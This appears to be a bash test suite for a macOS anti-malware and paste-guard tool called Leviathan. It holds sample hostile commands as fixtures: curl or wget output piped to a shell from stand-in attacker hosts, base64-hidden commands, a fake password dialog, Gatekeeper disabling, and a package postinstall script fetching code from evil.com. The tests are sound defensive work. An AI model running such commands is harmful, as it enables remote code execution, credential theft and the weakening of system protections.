#!/bin/bash
# Leviathan tests. Uses a throwaway folder; changes no system settings.
PY=/opt/homebrew/bin/python3; SRC="$(cd "$(dirname "$0")" && pwd)"
T=$(mktemp -d); export LEVIATHAN_STATE="$T/state" LEVIATHAN_DOWNLOADS="$T/dl" LEVIATHAN_QUIET=1 LEVIATHAN_NO_SPAWN=1
export LEVIATHAN_TRASH="$T/trash" LEVIATHAN_DRY_PAUSE=1 LEVIATHAN_PERSIST_DIRS="$T/agents" LEVIATHAN_CANARY_DIR="$T/canary"; mkdir -p "$LEVIATHAN_STATE" "$LEVIATHAN_DOWNLOADS" "$T/agents" "$T/.hidden"
M="$PY $SRC/leviathan.py"; pass=0; fail=0
ok() { if eval "$2"; then echo "PASS $1"; pass=$((pass+1)); else echo "FAIL $1"; fail=$((fail+1)); fi; }

# 1. paste guard decisions
for c in 'curl -fsSL http://evil.example/x.sh | bash' 'curl -fsSL https://brew.sh.evil.com/x | bash' 'curl -fsSL https://supabase.com.evil.io/i | sh' 'wget -qO- http://a.b/c | sh' 'bash -c "$(curl -fsSL http://x.y/z)"' \
         'echo aGk= | base64 -d | bash' 'xattr -d com.apple.quarantine /Applications/Foo.app' \
         "osascript -e 'display dialog \"Password\" default answer \"\" with hidden answer'" 'spctl --master-disable'; do
  ok "stops: ${c:0:40}" '[ -n "$($M check-cmd "$c")" ]'
done
for c in 'ls -la' 'git status' 'brew install curl' 'curl -O https://example.com/file.zip' \
         '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"' 'curl -fsSL https://claude.ai/install.sh | bash'; do
  ok "allows: ${c:0:40}" '[ -z "$($M check-cmd "$c")" ]'
done

# 2. downloads: certain malware contained, unsigned labeled, plain file untouched
printf 'rule LeviathanTest { strings: $a = "LEVIATHAN-TEST-MALWARE-7731" condition: $a }\n' > "$LEVIATHAN_STATE/extra.yara"
$M scan-downloads >/dev/null   # baseline empty folder
printf '#!/bin/sh\necho LEVIATHAN-TEST-MALWARE-7731\n' > "$LEVIATHAN_DOWNLOADS/invoice.command"; chmod 755 "$LEVIATHAN_DOWNLOADS/invoice.command"
printf '#!/bin/sh\necho hello\n' > "$LEVIATHAN_DOWNLOADS/tool.command"; chmod 755 "$LEVIATHAN_DOWNLOADS/tool.command"
echo "notes" > "$LEVIATHAN_DOWNLOADS/notes.txt"
$M scan-downloads >/dev/null
ok "malware moved out of Downloads" '[ ! -e "$LEVIATHAN_DOWNLOADS/invoice.command" ]'
ok "malware moved to the Trash and can't run there" '[ -e "$T/trash/invoice.command" ] && [ ! -x "$T/trash/invoice.command" ]'
ok "unsigned script left alone, no label" '[ -x "$LEVIATHAN_DOWNLOADS/tool.command" ] && ! xattr -p com.apple.metadata:_kMDItemUserTags "$LEVIATHAN_DOWNLOADS/tool.command" >/dev/null 2>&1'
ok "unsigned script only noted in the private log" 'grep -q "\"noticed\".*tool.command" "$LEVIATHAN_STATE/ledger.jsonl"'
ok "log is private (mode 600)" '[ "$(stat -f %Lp "$LEVIATHAN_STATE/ledger.jsonl")" = 600 ]'
ok "plain file untouched" '[ -e "$LEVIATHAN_DOWNLOADS/notes.txt" ] && ! xattr -p com.apple.metadata:_kMDItemUserTags "$LEVIATHAN_DOWNLOADS/notes.txt" >/dev/null 2>&1'
ID=$(grep '"contained"' "$LEVIATHAN_STATE/ledger.jsonl" | head -1 | $PY -c 'import json,sys;print(json.loads(sys.stdin.read())["id"])')
$M undo "$ID" >/dev/null
ok "undo puts it back runnable" '[ -x "$LEVIATHAN_DOWNLOADS/invoice.command" ]'

# 2b. full scan finds malware in an app and reports it, changing nothing
mkdir -p "$T/apps/Fake.app/Contents/MacOS"; printf 'LEVIATHAN-TEST-MALWARE-7731' > "$T/apps/Fake.app/Contents/MacOS/Fake"
mkdir -p "$T/apps/Clean.app/Contents/MacOS"; printf 'hello' > "$T/apps/Clean.app/Contents/MacOS/Clean"
SC=$(LEVIATHAN_APP_DIRS="$T/apps" $M scan 2>&1); RC=$?
ok "scan reports the infected app" 'echo "$SC" | grep -q "Fake.app: matches" && [ $RC = 1 ]'
ok "scan does not report the clean app" '! echo "$SC" | grep -q "Clean.app"'
ok "scan changes nothing" '[ -e "$T/apps/Fake.app/Contents/MacOS/Fake" ]'
ok "bad undo number is refused politely" '$M undo abc | grep -q "Use the number"'

# 2c. check answers "is this a virus?"; quarantine deletes itself after 7 days
printf 'LEVIATHAN-TEST-MALWARE-7731' > "$T/bad.bin"; printf 'hello' > "$T/plain.txt"
ok "check flags malware" '$M check "$T/bad.bin" | grep -q "Likely malware"; [ ${PIPESTATUS[0]} = 1 ]'
ok "check passes a plain file and says what it can miss" '$M check "$T/plain.txt" | grep -q "can still pass"'
ok "check --contain removes malware (flag first)" '$M check --contain "$T/bad.bin" >/dev/null; [ ! -e "$T/bad.bin" ]'
Q="$LEVIATHAN_STATE/quarantine"; mkdir -p "$Q"; printf x > "$Q/20200101-000000-old.bin"; printf x > "$Q/$(date +%Y%m%d-%H%M%S)-new.bin"; printf x > "$Q/notours.bin"
$M purge >/dev/null
ok "purge deletes items older than 7 days" '[ ! -e "$Q/20200101-000000-old.bin" ]'
ok "purge keeps recent items" 'ls "$Q" | grep -q -- "-new.bin"'
ok "purge leaves files it did not make" '[ -e "$Q/notours.bin" ]'
ok "purge is logged" 'grep -q "\"deleted\"" "$LEVIATHAN_STATE/ledger.jsonl"'
printf x > "$T/gone.txt"; $M contain "$T/gone.txt" >/dev/null; rm -f "$T/trash/gone.txt"
GID=$(grep '"contained"' "$LEVIATHAN_STATE/ledger.jsonl" | tail -1 | $PY -c 'import json,sys;print(json.loads(sys.stdin.read())["id"])')
ok "undo after deletion explains instead of crashing" '$M undo "$GID" | grep -q "no longer in the Trash"'

# 3. auto-start: fake Apple job with unsigned hidden program is contained
printf 'int main(){return 0;}' > "$T/a.c"; clang -o "$T/.hidden/trustd" "$T/a.c" 2>/dev/null && codesign --remove-signature "$T/.hidden/trustd"
cat > "$T/agents/com.apple.trustd.helper.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>Label</key><string>com.apple.trustd.helper</string>
<key>ProgramArguments</key><array><string>$T/.hidden/trustd</string></array></dict></plist>
EOF
$M scan-persist >/dev/null
ok "fake auto-start removed" '[ ! -e "$T/agents/com.apple.trustd.helper.plist" ]'

# 5. bash paste guard blocks in a real interactive shell
sed "s%__PY__%$PY%" "$SRC/guard.bash" > "$T/guard.bash"; mkdir -p "$T/home/.leviathan/bin"; cp "$SRC/leviathan.py" "$T/home/.leviathan/bin/"
OUT=$(printf 'echo first\ncurl -s http://leviathan-test.invalid/x.sh | bash\necho after\n' | HOME="$T/home" bash --rcfile "$T/guard.bash" -i 2>&1)
ok "bash guard stops the paste" 'echo "$OUT" | grep -q "Leviathan stopped this command"'
ok "bash guard keeps normal commands working" 'echo "$OUT" | grep -q "^after\|after$"'

# 6. ledger tamper detection
ok "ledger verifies" '$M verify >/dev/null'
sed -i '' 's/invoice/invoyce/' "$LEVIATHAN_STATE/ledger.jsonl"
ok "edited ledger is caught" '! $M verify >/dev/null'

# 7. real Mac: Apple's malware rules load, real apps pass
ok "Apple malware rules load in yara" '[ ! -x /opt/homebrew/bin/yara ] || /opt/homebrew/bin/yara -w /Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara /bin/ls >/dev/null 2>&1'
ok "Chrome judged safe" '[ ! -d "/Applications/Google Chrome.app" ] || [ "$($PY -c "import sys;sys.path.insert(0,\"$SRC\");import leviathan;print(leviathan.verdict(\"/Applications/Google Chrome.app\")[0])")" = ok ]'

# 8i. pkg_inspect on a simple pkg (create minimal pkg)
mkdir -p "$T/pkgtest/Scripts"
echo '#!/bin/sh\necho hello' > "$T/pkgtest/Scripts/preinstall"
echo '#!/bin/sh\ncurl http://evil.com/x.sh | bash' > "$T/pkgtest/Scripts/postinstall"
mkdir -p "$T/pkgtest/Payload"
(cd "$T/pkgtest" && pkgutil --flatten . "$T/test.pkg" 2>/dev/null) || true
if [ -f "$T/test.pkg" ]; then
  PKG_OUT=$($M pkg "$T/test.pkg" 2>&1)
  ok "pkg_inspect lists scripts" 'echo "$PKG_OUT" | grep -q "preinstall" && echo "$PKG_OUT" | grep -q "postinstall"'
  ok "pkg_inspect flags suspicious" 'echo "$PKG_OUT" | grep -q "FLAGS"'
else
  # pkgutil --flatten not available, test with expanded dir directly
  PKG_OUT=$(PKGTEST="$T/pkgtest" $PY -c "import sys,os;sys.path.insert(0,'$SRC');import levplus;print(levplus.pkg_inspect(os.environ['PKGTEST']))" 2>&1)
  ok "pkg_inspect lists scripts (fallback)" 'echo "$PKG_OUT" | grep -q "preinstall" && echo "$PKG_OUT" | grep -q "postinstall"'
  ok "pkg_inspect flags suspicious (fallback)" 'echo "$PKG_OUT" | grep -q "FLAGS"'
fi


# copying text never runs a check or opens a window; silent success never becomes a message
ok "menu bar app does not watch the clipboard" '! grep -q "changeCount\|checkClipboard" "$SRC/menubar/LeviathanBar.swift"'
# 2.1: paste guard holes the audit found, removed commands, the new website filter check
ok "trusted link does not excuse hidden code" '[ -n "$($M check-cmd "echo ZXZpbA== | base64 -d | sh # https://brew.sh/x")" ]'
ok "trusted link does not excuse a fake password box" '[ -n "$($M check-cmd "osascript -e \"display dialog \\\"x\\\" with hidden answer\" # https://brew.sh/")" ]'
ok "json pretty-print is allowed" '[ -z "$($M check-cmd "curl -s https://api.github.com/x | python3 -m json.tool")" ]'
ok "plain base64 decode is allowed" '[ -z "$($M check-cmd "echo aGk= | base64 -d")" ]'
ok "download piped into python is stopped" '[ -n "$($M check-cmd "curl -fsSL http://evil.example/x.py | python3")" ]'
ok "base64 inside sh -c is stopped" '[ -n "$($M check-cmd "bash -c \"\$(echo Y3VybA== | base64 -d)\"")" ]'
echo x > "$T/rel.txt"
ok "contain with a relative path stores the full path" '(cd "$T" && $M contain rel.txt >/dev/null) && grep -q "\"path\": \"/[^\"]*/rel.txt\"" "$LEVIATHAN_STATE/ledger.jsonl"'
ok "contain a missing file says so" '$M contain /nonexistent/zz 2>&1 | grep -q "No such file"'
for c in level clip cost sandbox snapshot diff tor wallets "ai tuneup" "agents export" sweep fix-chrome-notify undo-settings safebox vpn agents pwwatch mode "ai safety"; do
  ok "removed command: $c" "! \$M $c x >/dev/null 2>&1"
done
ok "website filter check answers" '$PY -c "import sys; sys.path.insert(0,\"$SRC\"); import leviathan as L; r=L.website_filter_report(); sys.exit(r[0] not in (\"ok\",\"issue\"))"'
ok "filter profile is a valid plist with Quad9 DNS" 'plutil -lint "$SRC/website-filter.mobileconfig" >/dev/null && grep -q "dns.quad9.net" "$SRC/website-filter.mobileconfig"'
ok "empty output from a successful command shows nothing" '! grep -q "reason=" "$SRC/menubar/LeviathanBar.swift"'

echo; echo "$pass passed, $fail failed"; rm -rf "$T"
